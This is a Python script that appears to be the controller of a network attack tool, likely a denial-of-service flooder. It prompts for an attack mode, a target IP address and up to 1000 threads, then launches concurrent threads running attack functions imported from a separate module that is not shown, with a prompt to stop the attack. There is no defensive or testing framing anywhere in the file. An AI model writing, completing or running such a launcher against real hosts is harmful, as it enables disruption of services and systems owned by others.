import threading
import time
import os
from attacks import attack_modes, validate_ip
from utils import display_menu, get_valid_input, log_activity

stop_flag = threading.Event()

def thread_worker(thread_id, target, mode_name, stop_flag):
    """Worker thread that displays status and coordinates attacks."""
    while not stop_flag.is_set():
        log_activity(f"Thread {thread_id} active | Mode: {mode_name} | Target: {target}")
        time.sleep(2)

def main():
    """Main program loop with professional error handling."""
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        display_menu()
        
        choice = input("\nEnter choice (1-4): ")
        
        if choice == "4":
            print("Exiting...")
            stop_flag.set()
            break
            
        if choice not in attack_modes:
            print("Invalid choice!")
            time.sleep(1)
            continue
            
        target_ip = input("Enter target IP: ")
        if not validate_ip(target_ip):
            print("Invalid IP format!")
            time.sleep(1)
            continue
            
        try:
            thread_count = int(input("Enter thread count (max 1000): "))
            thread_count = min(thread_count, 1000)
        except ValueError:
            print("Input must be a number.")
            time.sleep(1)
            continue

        # Start worker threads
        for i in range(thread_count):
            t = threading.Thread(
                target=thread_worker, 
                args=(i, target_ip, attack_modes[choice]['name'], stop_flag)
            )
            t.daemon = True
            t.start()
            time.sleep(0.01)

        # Start attack threads
        for i in range(thread_count):
            t = threading.Thread(
                target=attack_modes[choice]['function'],
                args=(target_ip, stop_flag)
            )
            t.daemon = True
            t.start()
            time.sleep(0.01)

        print(f"\nProcess started: {thread_count} threads targeting {target_ip}")
        input("\nPress Enter to stop attack...")
        stop_flag.set()
        time.sleep(1)
        stop_flag.clear()

if __name__ == "__main__":
    main()
